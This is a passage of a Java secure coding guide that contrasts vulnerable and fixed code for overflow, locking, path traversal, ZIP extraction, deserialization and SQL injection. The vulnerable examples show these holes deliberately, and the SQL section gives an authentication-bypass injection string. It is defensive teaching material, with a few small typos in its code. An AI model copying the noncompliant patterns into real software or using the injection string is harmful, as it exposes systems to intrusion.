# Java Secure Coding Guide

This document provides secure coding suggestions for Java-based development.

# Data Type

## Prevent integer overflow in numeric operations

**\[Description]**

Ensure that numeric operations do not create a numeric value that is outside of a specific integer range, so as to prevent integer overflows which may lead to unintended behavior.

The built-in integer operators do not indicate overflow or underflow in any way. Common addition, subtraction, multiplication, and division operations may cause integer overflows. In addition, the ranges of Java types are not symmetric (the negation of each minimum value is one more than each maximum value). Therefore, the `java.lang.Math.abs()` method which returns the absolute value of any number can also overflow if given the minimum as an argument.

Integer overflows can be avoided using precondition testing, Math class, upcasting, `BigInteger`, etc.

**\[Noncompliant Code Example]**

```java
public static int multNum(int num1, int num2) {
    return num1 * num2;
}
```

In this noncompliant code example, when the absolute values of **num1** and **num2** are large and the product of **num1** and **num2** is greater than `Integer.MAX_VALUE` or smaller than `Integer.MIN_VALUE`, the method cannot return the correct result, incurring an overflow.

**\[Compliant Code Example]**

```java
public static int multNum(int num1, int num2) {
    return Math.multiplyExact(num1, num2);
}
```

This compliant code example uses the `Math.multiplyExact()` method, which is added to Java as part of the Java 8 release, when it is impossible to predict whether an overflow may occur in multiplication operations. This method either returns a mathematically correct value or throw `ArithmeticException`. 

## Ensure that division and remainder operations do not result in divide-by-zero errors

**\[Description]**

A division or remainder by zero can result in abnormal program termination and denial of service (DoS). Therefore, the divisor in a division or remainder operation must be checked for zero prior to the operation.

**\[Noncompliant Code Example]**

```java
long dividendNum = 0;
long divisorNum = 0;
long result1 = dividendNum / divisorNum;
long result2 = dividendNum % divisorNum;
```

In this noncompliant code example, the divisor is not checked for zero prior to the operation, which may cause program errors.

**\[Compliant Code Example]**

```java
long dividendNum = 0;
long divisorNum = 0;
if (divisorNum != 0) {
    long result1 = dividendNum / divisorNum;
    long result2 = dividendNum % divisorNum;
}
```

This compliant code example tests the divisor to guarantee there is no possibility of divide-by-zero errors before the operation.

# Expressions

## Do not use a null in any case where an object is required to prevent null pointer reference

**\[Description]**

Using a null in cases where an object is required results in a `NullPointerException` being thrown. Such exceptions should be resolved through pre-check rather than `try...catch`.

**\[Noncompliant Code Example]**

```java
String env = System.getenv(SOME_ENV);
if (env.length() > MAX_LENGTH) {
    ...
}
```

In this noncompliant code example, the return value of `System.getenv()` may be null, but `env` is not checked for null before it is used. As a result, a null pointer reference occurs.

**\[Compliant Code Example]**

```java
String env = System.getenv(SOME_ENV);
if (env != null && env.length() > MAX_LENGTH) {
    ...
}
```

The compliant code example eliminates null pointer reference by adding a null check for the `System.getenv()` return value.

# Concurrency and Multithreading

## Ensure that actively held locks are released on exceptional conditions

**\[Description]**

An unreleased lock in any thread will prevent other threads from acquiring the same lock, leading to blocking. Programs must release all actively held locks on exceptional conditions. Intrinsic locks of class objects used for method and block synchronization are automatically released on exceptional conditions. However, most Java lock objects are not closeable, so they cannot be automatically released using the try-with-resources feature. In this case, programs must release the locks actively.

**Noncompliant Code Example** (Checked Exception)

```java
public final class Foo {
    private final Lock lock = new ReentrantLock();

    public void incorrectReleaseLock() {
        try {
            lock.lock();
            doSomething();
            lock.unlock();
        } catch (MyBizException ex) {
            //Handle the exception
        }
    }

    private void doSomething() throws MyBizException {
        ...
    }
}
```

This noncompliant code example uses a `ReentrantLock`. However, the catch block fails to release the lock when an exception is thrown by the `doSomething()` method.

**\[Compliant Code Example]** (**finally** Block)

```java
public final class Foo {
    private final Lock lock = new ReentrantLock();

    public void correctReleaseLock() {
        lock.lock();
        try {
            doSomething();
        } catch (MyBizException ex) {
            //Handle the exception
        } finally {
            lock.unlock();
        }
    }

    private void doSomething() throws MyBizException {
        ...
    }
}
```

This compliant code example encapsulates operations that could throw an exception in a **try** block immediately after acquiring the lock. The lock is acquired before the **try** block, which ensures that it is held when the **finally** block executes. Calling `lock.unlock()` in the **finally** block ensures that the lock can be released even in the event of an exception.

**Noncompliant Code Example** (Unchecked Exception)

```java
final class Foo {
    private final Lock lock = new ReentrantLock();

    public void incorrectReleaseLock(String value) {
        lock.lock();
        ...
        int index = Integer.parseInt(value);
        ...
        lock.unlock();
    }
}
```

In this noncompliant code example, when the string passed by the `incorrectReleaseLock()` method is not a number, a `NumberFormatException` will be thrown in subsequent operations. Consequently, the lock is not correctly released.

**\[Compliant Code Example]** (**finally** Block)

```java
final class Foo {
    private final Lock lock = new ReentrantLock();

    public void correctReleaseLock(String value) {
        lock.lock();
        try {
            ...
            int index = Integer.parseInt(value);
            ...
        } finally {
            lock.unlock();
        }
    }
}
```

This compliant code example encapsulates operations that could throw an exception in a **try** block immediately after acquiring the lock. The lock is acquired before the **try** block, which ensures that it is held when the **finally** block executes. Calling `lock.unlock()` in the **finally** block ensures that the lock can be released even in the event of an exception.

## Do not use **Thread.stop()** to terminate threads

**\[Description]**

Threads preserve class invariants when they are allowed to exit normally. Some thread APIs were initially introduced to facilitate thread suspension, resumption, and termination but were later deprecated due to inherent design weaknesses. For example, the `Thread.stop()` method causes the thread to immediately throw a `ThreadDeath` exception, which usually stops the thread. Calling `Thread.stop()` results in the release of all locks acquired by a thread, potentially exposing the objects protected by the locks when those objects are in an inconsistent state.

**\[Noncompliant Code Example]** (Deprecated **Thread.stop()**)

```java
public final class Foo implements Runnable {
    private final Vector<Integer> vector = new Vector<Integer>(1000);

    public Vector<Integer> getVector() {
        return vector;
    }

    @Override
    public synchronized void run() {
        Random number = new Random(123L);
        int i = vector.capacity();
        while (i > 0) {
            vector.add(number.nextInt(100));
            i--;
        }
    }

    public static void main(String[] args) throws InterruptedException {
        Thread thread = new Thread(new Foo());
        thread.start();
        Thread.sleep(5000);
        thread.stop();
    }
}
```

In this noncompliant code example, a thread fills a vector with pseudorandom numbers. The thread is forcefully stopped after a specific period of time. Because **Vector** is a thread-safe class, the operations performed by multiple threads on the shared instance will leave it in a consistent state. For example, the `Vector.size()` method always returns the correct number of elements in the vector, because the vector instance uses its own intrinsic lock to synchronize state. However, the `Thread.stop()` method causes the thread to stop and throw a `ThreadDeath` exception. All acquired locks are subsequently released. If the thread was in the process of adding a new integer when it was stopped, the vector would be in an inconsistent state. For example, this could result in `Vector.size()` returning an incorrect element count because the element count was incremented after the element is added.

**\[Compliant Code Example]** (Setting a Thread End Flag)

```java
public final class Foo implements Runnable {
    private final Vector<Integer> vector = new Vector<Integer>(1000);

    private boolean done = false;

    public Vector<Integer> getVector() {
        return vector;
    }

    public void shutdown() {
        done = true;
    }

    @Override
    public synchronized void run() {
        Random number = new Random(123L);
        int i = vector.capacity();
        while (!done && i > 0) {
            vector.add(number.nextInt(100));
            i--;
        }
    }

    public static void main(String[] args) throws InterruptedException {
        Foo foo = new Foo();
        Thread thread = new Thread(foo);
        thread.start();
        Thread.sleep(5000);
        foo.shutdown();
    }
}
```

This compliant code example uses a flag to request thread termination. The `shutdown()` method is used to set the flag to **true**. The `run()` method of the thread terminates when it finds the flag is **true**.

**\[Compliant Code Example]** (Interruptible)

```java
public final class Foo implements Runnable {
    private final Vector<Integer> vector = new Vector<Integer>(1000);

    public Vector<Integer> getVector() {
        return vector;
    }

    @Override
    public synchronized void run() {
        Random number = new Random(123L);
        int i = vector.capacity();
        while (!Thread.interrupted() && i > 0) {
            vector.add(number.nextInt(100));
            i--;
        }
    }

    public static void main(String[] args) throws InterruptedException {
        Foo foo = new Foo();
        Thread thread = new Thread(foo);
        thread.start();
        Thread.sleep(5000);
        thread.interrupt();
    }
}
```

The compliant code example calls the `Thread.interrupt()` method to terminate the thread. Calling `Thread.interrupt()` sets an internal termination flag. The thread polls that flag using the `Thread.interrupted()` method, which both returns **true** if the current thread has been terminated and clears the termination flag.

## Clear customized **ThreadLocal** variables when the thread in the thread pool ends

**\[Description]**

Thread pooling reduces thread creation overhead by reusing threads. However, the reuse of threads causes two problems related to the use of `ThreadLocal` variables:

- Dirty data: `ThreadLocal` variables are not correctly initialized for the current task. Consequently, the task sees `ThreadLocal` variables set by another task executed on the same thread.
- Memory leak: Since `ThreadLocal` variables are not actively released, the memory cannot be actively reclaimed.

Therefore, the `ThreadLocal` variables used by each task in the thread pool must be automatically cleared after the task ends.

**\[Compliant Code Example]**

```java
public class TestThreadLocal {
    public static void main(String[] args) {
        ThreadPoolExecutor pool = new ThreadPoolExecutor(1, 2, 100,
            TimeUnit.MILLISECONDS, new LinkedBlockingQueue<Runnable>(),
            Executors.defaultThreadFactory(), new ThreadPoolExecutor.CallerRunsPolicy());
        for (int i = 0; i < 20; i++) {
            pool.execute(new TestThreadLocalTask());
        }
    }
}

class TestThreadLocalTask implements Runnable {
    private static ThreadLocal<Integer> localValue = new ThreadLocal<>();

    @Override
    public void run() {
        localValue.set(STATE1);
        try {
            ...
            localValue.set(STATE3);
            ...
        } finally {
            localValue.remove(); //Use the remove() method to clear local variables of the thread to avoid memory leak
        }
    }
}
```

# Input/Output

## Create files with appropriate access permissions on multi-user systems

**\[Description]**

Files in multi-user systems are generally owned by a particular user. The owner of the files can specify which other users in the system are allowed to access the files. These file systems use a privilege and permission model to protect file access. When a file is created, the file access permissions dictate who are allowed to access or operate on the file. When a program creates a file with insufficiently restrictive access permissions, an attacker may read or modify the file before the program can modify the permissions. Consequently, files must be created with access permissions that prevent unauthorized file access.

**\[Noncompliant Code Example]**

```java
Writer out = new FileWriter("file");
```

The constructors for `FileOutputStream` and `FileWriter` do not allow programmers to explicitly specify file access permissions. In this noncompliant code example, the access permissions of any file created are implementation-defined and may not prevent unauthorized access.

**\[Compliant Code Example]**

```java
Path file = new File("file").toPath();

//Throw an exception, rather than overwrite an existing file
Set<OpenOption> options = new HashSet<OpenOption>();
options.add(StandardOpenOption.CREATE_NEW);
options.add(StandardOpenOption.APPEND);

//Set file permissions to allow only the owner to read/write the file
Set<PosixFilePermission> perms = PosixFilePermissions.fromString("rw-------");
FileAttribute<Set<PosixFilePermission>> attr =
    PosixFilePermissions.asFileAttribute(perms);
try (SeekableByteChannel sbc = Files.newByteChannel(file, options, attr)) {
    ... //Write data
}
```

**\[Exception]**

When a file is created inside a directory that is both secure and unreadable to untrusted users, the file may be created with the default access permissions. This is the case, for example, if the entire file system is trusted or accessible only to trusted users.

## Validate and canonicalize path names constructed using external data

**\[Description]**

If a path name is constructed using external data, it must be verified. Otherwise, a path traversal vulnerability may occur.

A path name may be either absolute or relative and may contain file links, such as symbolic links, shortcuts, and shadows, which all affect path name validation. Therefore, path names must be canonicalized before being validated. Be sure to use `getCanonicalPath()`, but not `getAbsolutePath()`, to canonicalize path names, because the latter does not guarantee correct canonicalization on all platforms.

**\[Noncompliant Code Example]**

```java
public void doSomething() {
    File file = new File(HOME_PATH, fileName);
    String path = file.getPath();

    if (!validatePath(path)) {
        throw new IllegalArgumentException("Path Traversal vulnerabilities may exist!") ;
    }
    ... //Perform read and write operations on the file
}

private boolean validatePath(String path) {
    if (path.startsWith(HOME_PATH)) {
        return true;
    } else {
        return false;
    }
}
```

In this noncompliant code example, the file name comes from external input and is directly concatenated with a fixed path name to generate the actual path name. Before the file is accessed, `validatePath` is used to check whether the actual path name is under a fixed directory. However, an attacker can still access a file outside **HOME\_PATH** by entering an argument that contains **../**.

**\[Compliant Code Example]** (**getCanonicalPath()**)

```java
public void doSomething() {
    File file = new File(HOME_PATH, fileName);
    try {
        String canonicalPath = file.getCanonicalPath();
        if (!validatePath(canonicalPath)) {
            throw new IllegalArgumentException("Path Traversal vulnerability!");
        }
        ... //Perform read and write operations on the file
    } catch (IOException ex) {
        throw new IllegalArgumentException("An exception occurred ...", ex);
    }
}

private boolean validatePath(String path) {
    if (path.startsWith(HOME_PATH)) {
        return true;
    } else {
        return false;
    }
}
```

This compliant code example canonicalizes the path name constructed using the externally-supplied file name, and validates the canonicalized path name before performing file read/write operations. This practice can effectively prevent risks like path traversal.

## Perform security check when decompressing a ZIP archive using **ZipInputStream**

**\[Description]**

A number of security concerns must be considered when extracting files from a ZIP archive using `java.util.zip.ZipInputStream`:

**1\. Extracting files outside the intended directory**

File names may contain **../** sequences that may cause the files to be extracted outside of the intended directory. Therefore, file names must be validated when files are extracted from a ZIP archive. If the destination path of any file in the ZIP archive is not within the expected directory, either refuse to extract it or extract it to a safe location.

**2\. Excessive consumption of system resources during file extraction**

When extracting files from a ZIP archive, both the number and size of the extracted files need to be limited. The zip algorithm can produce very large compression ratios, to compress a huge file into a small ZIP archive. If the actual size of the files in the ZIP archive is not checked, the extracted files may occupy a large amount of system resources, resulting in a ZIP bomb attack. Therefore, programs must refuse to extract files beyond a certain size limit. The actual limit depends on the capabilities of the platform.

**\[Noncompliant Code Example]**

```java
public void unzip(String fileName, String dir) throws IOException {
    try (FileInputStream fis = new FileInputStream(fileName);
        ZipInputStream zis = new ZipInputStream(fis)) {
        ZipEntry entry;
        File tempFile;
        byte[] buf = new byte[10240];
        int length;

        while ((entry = zis.getNextEntry()) != null) {
            tempFile = new File(dir, entry.getName());
            if (entry.isDirectory()) {
                tempFile.mkdirs();
                continue;
            }

            try (FileOutputStream fos = new FileOutputStream(tempFile)) {
                while ((length = zis.read(buf)) != -1) {
                    fos.write(buf, 0, length);
                }
            }
        }
    }
}
```

This noncompliant code example does not validate the name of the file that is being unzipped. It passes the name directly to the constructor of `FileOutputStream`. It also fails to check the resource consumption of the file that is being unzipped. It permits the operation to run to completion or until local resources are exhausted.

**\[Compliant Code Example]**

```java
private static final long MAX_FILE_COUNT = 100L;
private static final long MAX_TOTAL_FILE_SIZE = 1024L * 1024L;

...

public void unzip(FileInputStream zipFileInputStream, String dir) throws IOException {
    long fileCount = 0;
    long totalFileSize = 0;

    try (ZipInputStream zis = new ZipInputStream(zipFileInputStream)) {
        ZipEntry entry;
        String entryName;
        String entryFilePath;
        File entryFile;
        byte[] buf = new byte[10240];
        int length;

        while ((entry = zis.getNextEntry()) != null) {
            entryName = entry.getName();
            entryFilePath = sanitizeFileName(entryName, dir);
            entryFile = new File(entryFilePath);

            if (entry.isDirectory()) {
                creatDir(entryFile);
                continue;
            }

            fileCount++;
            if (fileCount > MAX_FILE_COUNT) {
                throw new IOException("The ZIP package contains too many files.");
            }

            try (FileOutputStream fos = new FileOutputStream(entryFile)) {
                while ((length = zis.read(buf)) != -1) {
                    totalFileSize += length;
                    zipBombCheck(totalFileSize);
                    fos.write(buf, 0, length);
                }
            }
        }
    }
}

private String sanitizeFileName(String fileName, String dir) throws IOException {
    file = new File(dir, fileName);
    String canonicalPath = file.getCanonicalPath();
    if (canonicalPath.startsWith(dir)) {
        return canonicalPath;
    }
    throw new IOException("Path Traversal vulnerability: ...");
}

private void creatDir(File dirPath) throws IOException {
    boolean result = dirPath.mkdirs();
    if (!result) {
        throw new IOException("Create dir failed, path is : " + dirPath.getPath());
    }
    ...
}

private void zipBombCheck(long totalFileSize) throws IOException {
    if (totalFileSize > MAX_TOTAL_FILE_SIZEG) {
        throw new IOException("Zip Bomb! The size of the file extracted from the ZIP package is too large.");
    }
}
```

This compliant code example validates the name of each file before unzipping it. If a file name is invalid, the extraction is aborted. In fact, a compliant solution could also skip that file and continue the extraction process, or extract the file to a safe location. Furthermore, the code inside the while loop tracks the total size of extracted files and throws an exception if the total size hits the upper limit **MAX\_TOTAL\_FILE\_SIZE**. The code also counts the number of file entries in the ZIP archive and throws an exception if the total number of files hits the upper limit **MAX\_FILE\_COUNT**.

Note: `entry.getSize()` reads the pre-decompression size of individual files from a fixed field, which may have been tampered with. Therefore, do not use `entry.getSize()` to collect statistics about the extracted file size.

## Use integer return type of methods that read a character or byte from a stream

**\[Description]**

The `InputStream.read()` and `Reader.read()` methods are used to read a byte or character, respectively, from a stream.

The `InputStream.read()` method reads a single byte from an input source and returns its value as an 8-bit integer in the range 0x00 to 0xff. The `Reader.read()` method reads a single character and returns its value as a 16-bit integer in the range 0x0000 to 0xffff. 

Both methods return the 32-bit integer –1 (0xffffffff) to indicate that the end of the stream has been reached and no data is available. 

Prematurely converting the resulting integer to a **byte** or **char** before testing for the value −1 (0xffffffff) makes it impossible to distinguish between characters read and the end of stream indicator.

**\[Noncompliant Code Example]** (**byte**)

```java
FileInputStream in = getReadableStream();

byte data;
while ((data = (byte) in.read()) != -1) {
    //Use data
    ...
}
```

This noncompliant code example casts the value returned by the `read()` method directly to a value of the **byte** type and then compares this value with −1 in an attempt to detect the end of the stream. If the `read()` method returns 0xff which is then converted into a signed byte value –1, it will be incorrectly taken as the end of the stream.

**\[Noncompliant Code Example]** (**char**)

```java
InputStreamReader in = getReader();

char data;
while ((data = (char) in.read()) != -1) {
    //Use data
    ...
}
```

This noncompliant code example casts the value returned by the `read()` method directly to a value of the **char** type and then compares this value with −1 in an attempt to detect the end of the stream. When the end of stream is read, the return value cast to the **char** type is not −1. Consequently, the while loop cannot properly end. The reason is as follows: When the end of stream indicator –1 (0xffffffff) is forcibly converted to the **char** type, it will be converted to 0xffff, instead of –1. Consequently, the test for the end of file never evaluates to true.

**\[Compliant Code Example]** (**byte**)

```java
FileInputStream in = getReadableStream();

byte data;
int result;
while ((result = in.read()) != -1) {
    data = (byte) result;
    //Use data
    ...
}
```

**\[Compliant Code Example]** (**char**)

```java
InputStreamReader in = getReader();

char data;
int result;
while ((result = in.read()) != -1) {
    data = (char) result;
    //Use data
    ...
}
```

This compliant code example uses a variable of the **int** type to capture the value returned by `read()`, and uses the return value to determine whether the end of stream is read. If the end of stream is not read, the read content is converted to the **char** or **byte** type, so as to avoid misinterpretation of the end of stream.

## Do not let external processes block on input and output streams

**\[Description]**

Two methods can be used to invoke external processes:

1. **exec()** of **java.lang.Runtime**
2. **start()** of **java.lang.ProcessBuilder**

They all return a **java.lang.Process** object which has encapsulated the external processes.

This process contains an input stream, output stream, and error stream, which must be properly handled to prevent them from being blocked by external processes.

Incorrect handling can cause unexpected exceptions, DoS, and other security problems.

1\. Handling the input stream (`Process.getOutputStream()`) of an external process: **From the invoker's perspective, the input stream of an external process is its output stream**: A process that tries to read input on an empty input stream will block until input is supplied.

2\. Handling the output stream (`Process.getInputStream()`) and error stream (`Process.getErrorStream()`) of an external process: If the external process to be invoked has both output and error streams and the streams are not emptied, the output of the process may exhaust the buffer of the output and error streams. Consequently, the external process is blocked, and the interaction between the invoker and external process is affected. When `java.lang.ProcessBuilder` is used to invoke an external process, the error stream of the process can be redirected to the output stream using the `redirectErrorStream()` method, and the invoker can empty the output stream so that the error stream is emptied together.

**\[Noncompliant Code Example]** (Incorrectly Handling the Return Result of an External Process)

```java
public void execExtProcess() throws IOException {
    Process proc = Runtime.getRuntime().exec("ProcessMaybeStillRunning");
    int exitVal = proc.exitValue();
}
```

In this noncompliant code example, the program invokes the `exitValue()` method when the ProcessMaybeStillRunning process has not terminated, which may result in an `IllegalThreadStateException`.

**\[Noncompliant Code Example]** (Failure to Handle the Output and Error Streams of an External Process)

```java
public void execExtProcess() throws IOException, InterruptedException {
    Process proc = Runtime.getRuntime().exec("ProcessMaybeStillRunning");
    int exitVal = proc.waitFor();
}
```

Different from the previous example, this example will not result in an `IllegalThreadStateException`. However, the security problems described in the "Description" part may occur since the output and error streams of ProcessMaybeStillRunning are not handled.

**\[Compliant Code Example]**

```java
public class ProcessExecutor {
    public void callExtProcess() throws IOException, InterruptedException {
        Process proc = Runtime.getRuntime().exec("ProcessHasOutput");

        StreamConsumer errConsumer = new StreamConsumer(proc.getErrorStream());
        StreamConsumer outputConsumer = new StreamConsumer(proc.getInputStream());

        errConsumer.start();
        outputConsumer.start();

        int exitVal = proc.waitFor();

        errConsumer.join();
        outputConsumer.join();
    }

    class StreamConsumer extends Thread {
        InputStream is;

        StreamConsumer(InputStream is) {
            this.is = is;
        }

        @Override
        public void run() {
            try {
                byte data;
                int result;
                while ((result = is.read()) != -1) {
                    data = (byte) result;
                    handleData(data);
                }
            } catch (IOException ex) {
                //Handle the exception
            }
        }

        private void handleData(byte data) {
            ...
        }
    }
}
```

This compliant code example spawns two threads to read the output and error streams, so that the external process will not indefinitely block on the streams.

**\[Exception]**

External processes that do not use input, output, or error streams do not need stream handling.

## Promptly remove temporary files after use

**\[Description]**

Temporary files can be used for many purposes, for example, sharing data between processes, caching memory data, and dynamically constructing class files and library files. They may be created in the shared temporary file directory of the operating system. Files in such a directory may be regularly cleaned up, for example, every night or at system restart. However, if the files are not securely created or are still accessible after fulfilling the intended purpose, an attacker who has access to the local file system can perform operations on the files in shared directories. Removing temporary files when they are no longer required allows file names and other resources (such as secondary storage) to be recycled. Each program is responsible for ensuring that temporary files are removed during normal operation.

**\[Noncompliant Code Example]**

```java
public boolean uploadFile(InputStream in) throws IOException {
    File tempFile = File.createTempFile("tempname", ".tmp");
    try (FileOutputStream fop = new FileOutputStream(tempFile)) {
        int readSize;
        do {
            readSize = in.read(buffer, 0, MAX_BUFF_SIZE);
            if (readSize > 0) {
                fop.write(buffer, 0, readSize);
            }
        } while (readSize >= 0);
        ... //Perform other operations on the temporary file
    }
}
```

In this noncompliant code example, the temporary file is not removed upon completion.

**\[Compliant Code Example]**

```java
public boolean uploadFile(InputStream in) throws IOException {
    File tempFile = File.createTempFile("tempname", ".tmp");
    try (FileOutputStream fop = new FileOutputStream(tempFile)) {
        int readSize;
        do {
            readSize = in.read(buffer, 0, MAX_BUFF_SIZE);
            if (readSize > 0) {
                fop.write(buffer, 0, readSize);
            }
        } while (readSize >= 0);
        ... //Perform other operations on the temporary file
    } finally {
        if (!tempFile.delete()) {
            //Ignore
        }
    }
}
```

In this compliant code example, the **finally** statement removes the temporary file after using it.

# Serialization

#### Do not deserialize external data directly

**\[Description]**

Deserialization is the process of deserializing a binary stream or string into a Java object. Deserializing external data can cause an attacker to construct a specified object, execute malicious code, inject malicious data into an application, or perform other malicious operations. Insecure deserialization can lead to attacks such as arbitrary code execution, privilege escalation, arbitrary file access, and DoS.

Third-party components are usually used to serialize and deserialize data in JSON, XML, and YAML formats. Common third-party components include fastjson, jackson, XMLDecoder, XStream, and SnakeYmal.

**\[Noncompliant Code Example]**

```java
public class DeserializeExample implements Serializable {
    private static final long serialVersionUID = -5809782578272943999L;

    private String name;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    private void readObject(java.io.ObjectInputStream ois) {
        ois.defaultReadObject();
        System.out.println("Hack!");
    }
}

    //Deserialize external data
    ObjectInputStream ois2= new ObjectInputStream(fis);
    PersonInfo myPerson = (PersonInfo) ois2.readObject();
```

In this noncompliant code example, when the object of the deserialization operation is the serialization result of the **DeserializeExample** object constructed by the attacker, an error will be reported when the `PersonInfo myPerson = (PersonInfo) ois2.readObject()` statement is executed, but the attack code in the `readObject()` method of the **DeserializeExample** object is executed.

**\[Compliant Code Example]** (Trustlist Validation)

```java
public final class SecureObjectInputStream extends ObjectInputStream {
    public SecureObjectInputStream() throws SecurityException, IOException {
        super();
    }

    public SecureObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    protected Class<?> resolveClass(ObjectStreamClass desc)
        throws IOException, ClassNotFoundException {
        if (!desc.getName().equals("com.xxxx.PersonInfo")) {//Trustlist validation
            throw new ClassNotFoundException(desc.getName() + " not find");
        }
        return super.resolveClass(desc);
    }
}
```

In this compliant code example, trustlist validation is performed on the class to be deserialized by reloading the `resolveClass()` method in the customized **ObjectInputStream**. It throws an exception when the class name is not in the trustlist.

**\[Compliant Code Example]** (Using Security Manager)

It is advised to use the Java security manager provided by the product wherever available.

(1) Set **enableSubclassImplementation**.

```
permission java.io.SerializablePermission "enableSubclassImplementation";

```

(2) Customize **ObjectInputStream** and reload **resolveClass**.

```java
public final class HWObjectInputStream extends ObjectInputStream {
    public HWObjectInputStream() throws SecurityException, IOException {
        super();
    }

    public HWObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    protected Class<?> resolveClass(ObjectStreamClass desc)
        throws IOException, ClassNotFoundException {
        SecurityManager sm = System.getSecurityManager();
        if (sm != null) {
            sm.checkPermission(new SerializablePermission(
                "com.xxxx." + desc.getName()));
        }
        return super.resolveClass(desc);
    }
}
```

(3) Set a trustlist in the policy file.

```
permission java.io.SerializablePermission "com.xxxx.PersonInfo";

```

# External Data Validation

## Validate external data before using it

**\[Description]**

External data includes but is not limited to the network data, user input (including input in command lines and UIs), commands, files (including program configuration files), environment variables, and inter-process communication (including pipes, messages, shared memory, sockets, and RPCs), and cross-trust domain method parameters (for APIs).

Data outside the program is generally considered untrusted. Validation must be performed before using such data. Otherwise, incorrect calculation results, runtime exceptions, inconsistent object status, and injection attacks may occur, severely affecting the system.

**External data validation includes:**

- API parameter validation
- Data length validation
- Data range validation
- Data type and format validation
- Set size validation
- Validation to ensure that external data only contains permitted characters (trustlist validation), with special attention to special characters in certain cases

Pay attention to the following points when validating external data:

- Canonicalize external data before validation wherever necessary. For example, both **"\\uFE64"** and **\<** can represent **\<**. In web applications, if external input is not canonicalized, **"\\uFE64"** can be used to circumvent restrictions on **\<**.
- Modifications to external data must be done before validation to ensure that the validated data is exactly the data to be used.

For performance and code simplicity, the provider validates only the request information for RESTful APIs, and the consumer validates only the response result. For a method in a call chain, the outermost external public method must be validated, and the internal public method does not need to be validated.

**Common validation frameworks:**

Interface: The JSR 380 (Bean Validation 2.0) and JSR 303 (Bean Validation 1.0) JavaBean parameter validation standards defines the core interface **javax.validation.Validator** and many common validation annotations. 
Implementation: hibernate-validator and Spring validator

- hibernate-validator is an implementation of JSR 380 and JSR 303 standards, which extends annotations such as @Email, @Length, @NotEmpty, and @Range.
- Spring validator is also an implementation of JSR 380 and JSR 303, and provides the **MethodValidationPostProcessor** class for validating methods.

The product can select a proper validation framework or develop one.

**\[Noncompliant Code Example]**

```java
/**
 * Change company information
 *
 * @param companies New and old company information
 * @return Whether the company information is changed successfully
 */
@RequestMapping(value = "/updating", method = RequestMethod.POST)
public boolean updateCompany(@RequestBody Companies companies) {
    return employeeService.updateCompany(companies.getSrcCompany(),
        companies.getDestCompany());
}
```

In this noncompliant code example, the `updateCompany()` interface opened by the provider fails to validate the request, which may lead to attacks.

**\[Compliant Code Example]**

```java
/**
 * Change company information
 *
 * @param companies New and old company information
 * @return Whether the company information is changed successfully
 */
@RequestMapping(value = "/updating", method = RequestMethod.POST)
public boolean updateCompany(@RequestBody @Valid @NotNull Companies companies) {
    return employeeService.updateCompany(
        companies.getSrcCompany(), companies.getDestCompany());
}

@Setter
@Getter
public class Companies {
    @Valid
    @NotNull
    private Company srcCompany;

    @Valid
    @NotNull
    private Company destCompany;
}

@Setter
@Getter
@Accessors(chain = true)
public class Company {
    @NotBlank
    @Size(min = 10, max = 256)
    private String name;

    @NotBlank
    @Size(min = 10, max = 512)
    private String address;

    @Valid
    private SubCompany subCompany;
}
```

This compliant code example uses the @Valid annotation to trigger parameter validation, and the validation logic is the rule specified by the annotation during object attribute declaration. Since the public method `employeeService.updateCompany()` is invoked inside the current module and parameter validation is performed for the invocation, further validation is not required.

**\[Noncompliant Code Example]**

This noncompliant code example directly uses the obtained environment variable value without validating it.

```java
public static String getFile(String filePath, String fileName) {
    //Obtain the class path of the process
    String path = System.getProperty(RUNTIME_BASE_DIR);
    //Directly use it
}
```

**\[Compliant Code Example]**

This compliant code example uses the `getResource()` and `getResourceAsStream()` methods provided by ClassLoader to obtain resources from the loaded class path.

```java
public static String getSavePath(String filePath, String fileName) {
    return ClassLoader.getSystemResource(fileName).getPath();
}
```

Canonicalize the environment variable value and validate it before using it:

```java
public static String getFile(String filePath, String fileName) {
    //Obtain the class path of the process
    String path = System.getProperty(RUNTIME_BASE_DIR);

    //Canonicalization
    //Validation, for example, StringUtils.startsWith(path, "/opt/xxxx/release/");
    //Use
}
```

**\[Noncompliant Code Example]**

This noncompliant code example uses the configuration file without validating it.

```java
@Configuration
@PropertySource("classpath:xxx.properties")
@Component
public class XxxConfig {
    @Value("${appId}")
    private String appId;

    @Value("${secret}")
    private String citySecret;
}
```

**\[Compliant Code Example]**

The Spring Boot framework can use annotations @ConfigurationProperties and @Validated to validate the configuration file:

```java
@ConfigurationProperties(locations = "classpath: xxx.properties", prefix = "xxx")
@Validated
public class XxxConfig {
    @Value("${appId}")
    @Pattern(regexp = "[0-9_A-Z]{32}")
    private String appId;

    @Value("${secret}")
    @Pattern(regexp = "[0-9A-Z]{64,138}", message = "Authentication credential error!")
    private String citySecret;

    //Setter and Getter methods
}
```

The ServiceComb framework can use the **validation-api** provided by Java to obtain the configuration file object from the Bean context and explicitly invoke the validation method.

## Do not directly use external data to concatenate SQL statements

**\[Description]**

SQL injection occurs when the database operations represented by SQL statements constructed using external data do not behave as expected, which may lead to information leak or data tampering. The root cause is the direct use of external data to concatenate the SQL statements. The following measures can help prevent SQL injection:

- Parameterized query: the most effective, but not applicable to table names and field names in SQL statements;
- Trustlist validation on external data: applicable to table names and field names used to concatenate SQL statements;
- Escaping special characters related to SQL injection in external data: applicable to scenarios where SQL statements must be concatenated using strings. Only fields with quotation marks can be escaped.

Parameterized query is preferred because it is an easy way to effectively prevent SQL injection. In addition, parameterized query can improve database access performance. For example, SQL Server and Oracle databases cache a query plan for reuse when the same query statement is executed repeatedly. Common ORM frameworks (such as Hibernate and iBATIS) also support parameterized query.

**\[Noncompliant Code Example]** (Dynamically Building SQL Statements in Java Code)

```java
Statement stmt = null;
ResultSet rs = null;
try {
    String userName = request.getParameter("name");
    String password = request.getParameter("password");
    ...
    String sqlStr = "SELECT * FROM t_user_info WHERE name = '" + userName
        + "' AND password = '" + password + "'";
    stmt = connection.createStatement();
    rs = stmt.executeQuery(sqlString);
    ... //Handle the result set
} catch (SQLException ex) {
    //Handle the exception
}
```

This noncompliant code example uses the user-supplied user name and password to construct the SQL statement and verifies the user name and password. The SQL statement is constructed through concatenation, leading to SQL injection risks. An ill-intentioned user who knows the user name can perform the query using `zhangsan' OR 'a' = 'a` and an **arbitrary password**.

**\[Compliant Code Example]** (Using **PreparedStatement** for Parameterized Query)

```java
PreparedStatement stmt = null;
ResultSet rs = null;
try {
